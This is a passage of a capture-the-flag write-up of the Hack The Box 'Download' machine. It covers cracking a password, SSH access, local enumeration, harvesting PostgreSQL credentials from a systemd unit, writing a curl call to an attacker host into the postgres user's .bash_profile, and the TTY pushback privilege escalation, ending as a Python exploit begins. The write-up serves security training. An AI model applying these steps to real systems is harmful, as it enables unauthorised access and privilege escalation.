+<span class="n">Press</span> <span class="s1">'q'</span> <span class="ow">or</span> <span class="n">Ctrl</span><span class="o">-</span><span class="n">C</span> <span class="n">to</span> <span class="n">abort</span><span class="p">,</span> <span class="n">almost</span> <span class="nb">any</span> <span class="n">other</span> <span class="n">key</span> <span class="k">for</span> <span class="n">status</span>
+
+<span class="n">dunkindonuts</span>     <span class="p">(</span><span class="err">?</span><span class="p">)</span>     
+
+<span class="mi">1</span><span class="n">g</span> <span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="n">DONE</span> <span class="p">(</span><span class="mi">2023</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">20</span> <span class="mi">19</span><span class="p">:</span><span class="mi">34</span><span class="p">)</span> <span class="mf">20.00</span><span class="n">g</span><span class="o">/</span><span class="n">s</span> <span class="mi">3002</span><span class="n">Kp</span><span class="o">/</span><span class="n">s</span> <span class="mi">3002</span><span class="n">Kc</span><span class="o">/</span><span class="n">s</span> <span class="mi">3002</span><span class="n">KC</span><span class="o">/</span><span class="n">s</span> <span class="n">east11</span><span class="o">..</span><span class="n">dextor</span>
+<span class="n">Use</span> <span class="n">the</span> <span class="s2">"--show --format=Raw-MD5"</span> <span class="n">options</span> <span class="n">to</span> <span class="n">display</span> <span class="nb">all</span> <span class="n">of</span> <span class="n">the</span> <span class="n">cracked</span> <span class="n">passwords</span> <span class="n">reliably</span>
+<span class="n">Session</span> <span class="n">completed</span><span class="o">.</span>
+</pre></div>
+
+The password is <code>dunkindonuts</code>. Let's try using it to authenticate through SSH as the user <code>WESLEY</code>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ssh</span> <span class="n">wesley</span><span class="o">@</span><span class="mf">10.10.11.226</span>
+<span class="n">wesley</span><span class="o">@</span><span class="mf">10.10.11.226</span><span class="s1">'s password: </span>
+<span class="n">Welcome</span> <span class="n">to</span> <span class="n">Ubuntu</span> <span class="mf">20.04.6</span> <span class="n">LTS</span> <span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">5.4.0</span><span class="o">-</span><span class="mi">155</span><span class="o">-</span><span class="n">generic</span> <span class="n">x86_64</span><span class="p">)</span>
+
+ <span class="o">*</span> <span class="n">Documentation</span><span class="p">:</span>  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">help</span><span class="o">.</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span>
+ <span class="o">*</span> <span class="n">Management</span><span class="p">:</span>     <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">landscape</span><span class="o">.</span><span class="n">canonical</span><span class="o">.</span><span class="n">com</span>
+ <span class="o">*</span> <span class="n">Support</span><span class="p">:</span>        <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">advantage</span>
+
+  <span class="n">System</span> <span class="n">information</span> <span class="k">as</span> <span class="n">of</span> <span class="n">Mon</span> <span class="mi">20</span> <span class="n">Nov</span> <span class="mi">2023</span> <span class="mi">10</span><span class="p">:</span><span class="mi">35</span><span class="p">:</span><span class="mi">56</span> <span class="n">PM</span> <span class="n">UTC</span>
+
+  <span class="n">System</span> <span class="n">load</span><span class="p">:</span>           <span class="mf">0.82</span>
+  <span class="n">Usage</span> <span class="n">of</span> <span class="o">/</span><span class="p">:</span>            <span class="mf">58.8</span><span class="o">%</span> <span class="n">of</span> <span class="mf">5.81</span><span class="n">GB</span>
+  <span class="n">Memory</span> <span class="n">usage</span><span class="p">:</span>          <span class="mi">56</span><span class="o">%</span>
+  <span class="n">Swap</span> <span class="n">usage</span><span class="p">:</span>            <span class="mi">0</span><span class="o">%</span>
+  <span class="n">Processes</span><span class="p">:</span>             <span class="mi">635</span>
+  <span class="n">Users</span> <span class="n">logged</span> <span class="ow">in</span><span class="p">:</span>       <span class="mi">0</span>
+  <span class="n">IPv4</span> <span class="n">address</span> <span class="k">for</span> <span class="n">eth0</span><span class="p">:</span> <span class="mf">10.10.11.226</span>
+  <span class="n">IPv6</span> <span class="n">address</span> <span class="k">for</span> <span class="n">eth0</span><span class="p">:</span> <span class="n">dead</span><span class="p">:</span><span class="n">beef</span><span class="p">::</span><span class="mi">250</span><span class="p">:</span><span class="mi">56</span><span class="n">ff</span><span class="p">:</span><span class="n">feb9</span><span class="p">:</span><span class="mi">6</span><span class="n">d40</span>
+
+
+<span class="n">Expanded</span> <span class="n">Security</span> <span class="n">Maintenance</span> <span class="k">for</span> <span class="n">Applications</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">enabled</span><span class="o">.</span>
+
+<span class="mi">0</span> <span class="n">updates</span> <span class="n">can</span> <span class="n">be</span> <span class="n">applied</span> <span class="n">immediately</span><span class="o">.</span>
+
+<span class="n">Enable</span> <span class="n">ESM</span> <span class="n">Apps</span> <span class="n">to</span> <span class="n">receive</span> <span class="n">additional</span> <span class="n">future</span> <span class="n">security</span> <span class="n">updates</span><span class="o">.</span>
+<span class="n">See</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">esm</span> <span class="ow">or</span> <span class="n">run</span><span class="p">:</span> <span class="n">sudo</span> <span class="n">pro</span> <span class="n">status</span>
+
+
+<span class="n">The</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">available</span> <span class="n">updates</span> <span class="ow">is</span> <span class="n">more</span> <span class="n">than</span> <span class="n">a</span> <span class="n">week</span> <span class="n">old</span><span class="o">.</span>
+<span class="n">To</span> <span class="n">check</span> <span class="k">for</span> <span class="n">new</span> <span class="n">updates</span> <span class="n">run</span><span class="p">:</span> <span class="n">sudo</span> <span class="n">apt</span> <span class="n">update</span>
+<span class="n">Failed</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">changelogs</span><span class="o">.</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">meta</span><span class="o">-</span><span class="n">release</span><span class="o">-</span><span class="n">lts</span><span class="o">.</span> <span class="n">Check</span> <span class="n">your</span> <span class="n">Internet</span> <span class="n">connection</span> <span class="ow">or</span> <span class="n">proxy</span> <span class="n">settings</span>
+
+
+<span class="n">Last</span> <span class="n">login</span><span class="p">:</span> <span class="n">Thu</span> <span class="n">Aug</span>  <span class="mi">3</span> <span class="mi">08</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">52</span> <span class="mi">2023</span> <span class="kn">from</span> <span class="mf">10.10.14.23</span>
+<span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</pre></div>
+
+We have successfully accessed the system as the user <code>wesley</code>.<br/><br/>
+As <code>wesley</code>, we can read the first flag:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span> 
+<span class="mi">23195</span><span class="o">**********************</span><span class="mi">85</span><span class="n">bcf</span>
+<span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</pre></div>
+
+Looking at the groups to which the user 'WESLEY' belongs, I observed that it doesn't belong to any particularly interesting group:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="nb">id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">wesley</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">wesley</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">wesley</span><span class="p">)</span>
+<span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</pre></div>
+
+Upon listing its sudo privileges, I noticed that it doesn't have any sudo privileges:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
+<span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">wesley</span><span class="p">:</span> 
+<span class="n">Sorry</span><span class="p">,</span> <span class="n">user</span> <span class="n">wesley</span> <span class="n">may</span> <span class="ow">not</span> <span class="n">run</span> <span class="n">sudo</span> <span class="n">on</span> <span class="n">download</span><span class="o">.</span>
+<span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</pre></div>
+
+Nor are there any interesting capabilities that we could abuse:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">getcap</span> <span class="o">-</span><span class="n">r</span> <span class="o">/</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> 
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">gstreamer1</span><span class="mf">.0</span><span class="o">/</span><span class="n">gstreamer</span><span class="o">-</span><span class="mf">1.0</span><span class="o">/</span><span class="n">gst</span><span class="o">-</span><span class="n">ptp</span><span class="o">-</span><span class="n">helper</span> <span class="o">=</span> <span class="n">cap_net_bind_service</span><span class="p">,</span><span class="n">cap_net_admin</span><span class="o">+</span><span class="n">ep</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">ping</span> <span class="o">=</span> <span class="n">cap_net_raw</span><span class="o">+</span><span class="n">ep</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">mtr</span><span class="o">-</span><span class="n">packet</span> <span class="o">=</span> <span class="n">cap_net_raw</span><span class="o">+</span><span class="n">ep</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">traceroute6</span><span class="o">.</span><span class="n">iputils</span> <span class="o">=</span> <span class="n">cap_net_raw</span><span class="o">+</span><span class="n">ep</span>
+<span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</pre></div>
+
+Let's take a look at the <code>Set-UID</code> files. For this, I will use the <code>find</code> command:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">4000</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">policykit</span><span class="o">-</span><span class="mi">1</span><span class="o">/</span><span class="n">polkit</span><span class="o">-</span><span class="n">agent</span><span class="o">-</span><span class="n">helper</span><span class="o">-</span><span class="mi">1</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">dbus</span><span class="o">-</span><span class="mf">1.0</span><span class="o">/</span><span class="n">dbus</span><span class="o">-</span><span class="n">daemon</span><span class="o">-</span><span class="n">launch</span><span class="o">-</span><span class="n">helper</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">openssh</span><span class="o">/</span><span class="n">ssh</span><span class="o">-</span><span class="n">keysign</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">eject</span><span class="o">/</span><span class="n">dmcrypt</span><span class="o">-</span><span class="n">get</span><span class="o">-</span><span class="n">device</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">su</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">passwd</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">fusermount</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">at</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">umount</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">gpasswd</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">newgrp</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sudo</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">pkexec</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">chfn</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">mount</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">chsh</span>
+<span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</pre></div>
+
+There are no interesting files that we could abuse, so at this point, we can't do anything to escalate privileges.<br/><br/>
+Next, I will upload <a href="https://github.com/DominicBreuker/pspy">pspy</a> to the victim machine to inspect processes and commands running on the system.<br/><br/>
+<a href="https://github.com/DominicBreuker/pspy">pspy</a> is a command-line tool used to monitor processes and commands on Linux systems. It provides real-time visualization of system activities, including command execution and changes in processes, which can be useful for detecting suspicious activities or analyzing system behavior.<br/><br/>
+This tool could be helpful in detecting suspicious activities carried out by other users.<br/><br/>
+I downloaded the <a href="https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64">pspy64</a> release version and uploaded it to the victim machine:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="o">./</span><span class="n">pspy</span>
+<span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="o">./</span><span class="n">pspy</span>
+</pre></div>
+
+Analyzing the pspy output, I observed some SSH connections to the root user:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/download/img/24.png"/><br/><br/>
+Here are the interesting observations:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/download/img/25.png"/><br/><br/>
+The <code>root</code> user is checking the status of the <code>postgresql</code> service and the <code>download-site</code> service. The <code>download-site</code> service appears to be a custom service on the machine, which could be interesting to inspect.<br/><br/>
+The <code>root</code> user is also migrating to the <code>postgres</code> user using <code>su</code> and the <code>-l</code> parameter. Checking the <code>su</code> manual for information about the <code>-l</code> parameter, I found the following:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/download/img/26.png"/><br/><br/>
+The <code>-l</code> parameter is used to simulate a full login. When you use <code>su -l</code> or <code>su --login</code>, you are not just switching the user identity; you are also initializing the environment as if the new user had logged in directly.<br/><br/>
+This means that the user's login shell, environment variables, and working directory are set according to the target user's profile. It is particularly useful when you want to execute commands or start a shell session with the environment of another user, as if you had logged in as that user.<br/><br/>
+How can we exploit this?<br/><br/>
+Using the <code>-l</code> parameter also loads environment configurations, such as <code>.bashrc</code> and <code>.bash_profile</code> files, from the home directory. If we can modify these files for the <code>Postgres</code> user, we might be able to execute commands as that user by making changes to these files.<br/><br/>
+In other words, the <code>-l</code> parameter in the <code>su</code> command is crucial because it not only switches the user identity but also initializes the environment as if the specified user had logged in directly. This includes loading configuration files such as <code>.bashrc</code> and <code>.bash_profile</code> from the user's home directory.<br/><br/>
+In the context of the <code>Postgres</code> user, if we have the ability to modify the <code>.bashrc</code> or <code>.bash_profile</code> files associated with the <code>Postgres</code> user, we gain the potential to influence the environment settings for that user. By strategically altering these files, we may be able to execute commands with the permissions and configurations of the <code>Postgres</code> user, effectively manipulating its behavior and privileges on the system.<br/><br/>
+At this point, we are not able to modify or create these files. However, in the event that we gain access to a PostgreSQL database, attempting to modify these files could serve as a trick to escalate privileges.<br/><br/>
+Recalling the other commands that the <code>root</code> user was executing, one of them was <code>systemctl status download-site</code>. Since this is an unusual service, it is interesting to list its content. Therefore, let's first locate it in the filesystem:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">name</span> <span class="s2">"download-site.service"</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="n">system</span><span class="o">/</span><span class="n">download</span><span class="o">-</span><span class="n">site</span><span class="o">.</span><span class="n">service</span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="n">system</span><span class="o">/</span><span class="n">multi</span><span class="o">-</span><span class="n">user</span><span class="o">.</span><span class="n">target</span><span class="o">.</span><span class="n">wants</span><span class="o">/</span><span class="n">download</span><span class="o">-</span><span class="n">site</span><span class="o">.</span><span class="n">service</span>
+<span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">fs</span><span class="o">/</span><span class="n">cgroup</span><span class="o">/</span><span class="n">devices</span><span class="o">/</span><span class="n">system</span><span class="o">.</span><span class="n">slice</span><span class="o">/</span><span class="n">download</span><span class="o">-</span><span class="n">site</span><span class="o">.</span><span class="n">service</span>
+<span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">fs</span><span class="o">/</span><span class="n">cgroup</span><span class="o">/</span><span class="n">memory</span><span class="o">/</span><span class="n">system</span><span class="o">.</span><span class="n">slice</span><span class="o">/</span><span class="n">download</span><span class="o">-</span><span class="n">site</span><span class="o">.</span><span class="n">service</span>
+<span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">fs</span><span class="o">/</span><span class="n">cgroup</span><span class="o">/</span><span class="n">pids</span><span class="o">/</span><span class="n">system</span><span class="o">.</span><span class="n">slice</span><span class="o">/</span><span class="n">download</span><span class="o">-</span><span class="n">site</span><span class="o">.</span><span class="n">service</span>
+<span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">fs</span><span class="o">/</span><span class="n">cgroup</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="n">system</span><span class="o">.</span><span class="n">slice</span><span class="o">/</span><span class="n">download</span><span class="o">-</span><span class="n">site</span><span class="o">.</span><span class="n">service</span>
+<span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">fs</span><span class="o">/</span><span class="n">cgroup</span><span class="o">/</span><span class="n">unified</span><span class="o">/</span><span class="n">system</span><span class="o">.</span><span class="n">slice</span><span class="o">/</span><span class="n">download</span><span class="o">-</span><span class="n">site</span><span class="o">.</span><span class="n">service</span>
+<span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span>
+</pre></div>
+
+Upon inspecting its content, we found some <code>PostgreSQL</code> credentials:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="n">system</span><span class="o">/</span><span class="n">download</span><span class="o">-</span><span class="n">site</span><span class="o">.</span><span class="n">service</span>
+<span class="p">[</span><span class="n">Unit</span><span class="p">]</span>
+<span class="n">Description</span><span class="o">=</span><span class="n">Download</span><span class="o">.</span><span class="n">HTB</span> <span class="n">Web</span> <span class="n">Application</span>
+<span class="n">After</span><span class="o">=</span><span class="n">network</span><span class="o">.</span><span class="n">target</span>
+
+<span class="p">[</span><span class="n">Service</span><span class="p">]</span>
+<span class="n">Type</span><span class="o">=</span><span class="n">simple</span>
+<span class="n">User</span><span class="o">=</span><span class="n">www</span><span class="o">-</span><span class="n">data</span>
+<span class="n">WorkingDirectory</span><span class="o">=/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">app</span><span class="o">/</span>
+<span class="n">ExecStart</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">node</span> <span class="n">app</span><span class="o">.</span><span class="n">js</span>
+<span class="n">Restart</span><span class="o">=</span><span class="n">on</span><span class="o">-</span><span class="n">failure</span>
+<span class="n">Environment</span><span class="o">=</span><span class="n">NODE_ENV</span><span class="o">=</span><span class="n">production</span>
+<span class="n">Environment</span><span class="o">=</span><span class="n">DATABASE_URL</span><span class="o">=</span><span class="s2">"postgresql://download:CoconutPineappleWatermelon@localhost:5432/download"</span>
+
+<span class="p">[</span><span class="n">Install</span><span class="p">]</span>
+<span class="n">WantedBy</span><span class="o">=</span><span class="n">multi</span><span class="o">-</span><span class="n">user</span><span class="o">.</span><span class="n">target</span>
+<span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span>
+</pre></div>
+
+Let's try to log in to the <code>download</code> database:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">wesley</span><span class="nd">@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">psql</span> <span class="o">-</span><span class="n">U</span> <span class="s1">'download'</span> <span class="o">-</span><span class="n">h</span> <span class="mf">127.0.0.1</span> <span class="o">-</span><span class="n">d</span> <span class="n">download</span>
+<span class="n">Password</span> <span class="k">for</span> <span class="n">user</span> <span class="n">download</span><span class="p">:</span> 
+<span class="n">psql</span> <span class="p">(</span><span class="mf">12.15</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="mf">12.15</span><span class="o">-</span><span class="mi">0</span><span class="n">ubuntu0</span><span class="mf">.20.04.1</span><span class="p">))</span>
+<span class="n">SSL</span> <span class="n">connection</span> <span class="p">(</span><span class="n">protocol</span><span class="p">:</span> <span class="n">TLSv1</span><span class="mf">.3</span><span class="p">,</span> <span class="n">cipher</span><span class="p">:</span> <span class="n">TLS_AES_256_GCM_SHA384</span><span class="p">,</span> <span class="n">bits</span><span class="p">:</span> <span class="mi">256</span><span class="p">,</span> <span class="n">compression</span><span class="p">:</span> <span class="n">off</span><span class="p">)</span>
+<span class="n">Type</span> <span class="s2">"help"</span> <span class="k">for</span> <span class="n">help</span><span class="o">.</span>
+
+<span class="n">download</span><span class="o">=&gt;</span>
+</pre></div>
+
+First, let's attempt to write the <code>.bash_profile</code> file in the Postgres home directory (<code>/var/lib/postgresql/</code>).<br/><br/>
+There are some queries we can use. I will use the <code>COPY (SELECT '(file content)') to '(file directory path)'</code> approach.<br/><br/>
+First, we will attempt to make the Postgres user send us an HTTP request using the curl command to a server that we will be hosting on our attacker machine.<br/><br/>
+Let's set up our HTTP Server on port 80:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
+<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
+</pre></div>
+
+Now, let's write the <code>.bash_profile</code> file in the Postgres home directory:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">download</span><span class="o">=&gt;</span> <span class="n">COPY</span> <span class="p">(</span><span class="n">SELECT</span> <span class="s1">'curl 10.10.16.7'</span><span class="p">)</span> <span class="n">TO</span> <span class="s1">'/var/lib/postgresql/.bash_profile'</span><span class="p">;</span>
+<span class="n">COPY</span> <span class="mi">1</span>
+<span class="n">download</span><span class="o">=&gt;</span>
+</pre></div>
+
+Now, if we list the contents of the <code>/var/lib/postgresql</code> directory, the <code>.bash_profile</code> file with the new content will be present:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">postgresql</span><span class="o">/</span>
+<span class="n">total</span> <span class="mi">20</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">3</span> <span class="n">postgres</span> <span class="n">postgres</span> <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">21</span> <span class="mi">12</span><span class="p">:</span><span class="mi">19</span> <span class="o">.</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">41</span> <span class="n">root</span>     <span class="n">root</span>     <span class="mi">4096</span> <span class="n">Jul</span> <span class="mi">19</span> <span class="mi">16</span><span class="p">:</span><span class="mi">06</span> <span class="o">..</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">3</span> <span class="n">postgres</span> <span class="n">postgres</span> <span class="mi">4096</span> <span class="n">Apr</span> <span class="mi">21</span>  <span class="mi">2023</span> <span class="mi">12</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-------</span>  <span class="mi">1</span> <span class="n">postgres</span> <span class="n">postgres</span>    <span class="mi">5</span> <span class="n">Nov</span> <span class="mi">21</span> <span class="mi">12</span><span class="p">:</span><span class="mi">19</span> <span class="o">.</span><span class="n">bash_history</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">postgres</span> <span class="n">postgres</span>   <span class="mi">16</span> <span class="n">Nov</span> <span class="mi">21</span> <span class="mi">12</span><span class="p">:</span><span class="mi">19</span> <span class="o">.</span><span class="n">bash_profile</span>
+<span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">postgresql</span><span class="o">/.</span><span class="n">bash_profile</span>
+<span class="n">curl</span> <span class="mf">10.10.16.7</span>
+<span class="nd">@wesley@download</span><span class="p">:</span><span class="o">~/</span><span class="n">privesc</span><span class="err">$</span>
+</pre></div>
+
+After a while, we receive the HTTP request on our HTTP Server:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
+<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
+<span class="mf">10.10.11.226</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">21</span><span class="o">/</span><span class="n">Nov</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">09</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">13</span><span class="p">]</span> <span class="s2">"GET / HTTP/1.1"</span> <span class="mi">200</span> <span class="o">-</span>
+</pre></div>
+
+We're running commands as the <code>Postgres</code> user. At this point, we could gain access to the system as <code>Postgres</code>, but it's not necessary for this machine.<br/><br/>
+<h3><br>TTY Pushback</br></h3><br>
+After thorough research, I came across with the TTY Pushback vulnerability.<br/><br/>
+Since 1985, there has been a security issue known as "TTY pushbash." This issue has been intermittently discussed over the decades, with some indications that it is now being addressed in certain Linux distributions.<br/><br/>
+When a privileged process executes the 'su' command without the -P/--pty option, the new process operates within the same pseudo-terminal (PTY) as the old one. The vulnerability lies in an IOCTL target called TIOCSTI, which enables the injection of bytes into the input queue of the TTY (or PTY).<br/><br/>
+In practical terms, if an attacker can execute commands as a lower-privileged user while a higher-privileged user transitions to that lower-privileged state, they can subsequently run commands as the higher-privileged user. This occurs when the attacker has the ability to write to a script that executes during login (such as .profile). When the privileged user employs 'su -' (or 'su -l'), these commands within the script will be executed with elevated privileges.<br/><br/>
+I also found information on how to exploit it in the following <a href="https://www.errno.fr/TTYPushback.html">article</a>. We could use this information to exploit the vulnerability, as it includes a Python exploit.<br/><br/>
+Here is the exploit created by the article author:<br/><br/>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python3</span>
+<span class="kn">import</span> <span class="nn">fcntl</span>
+<span class="kn">import</span> <span class="nn">termios</span>
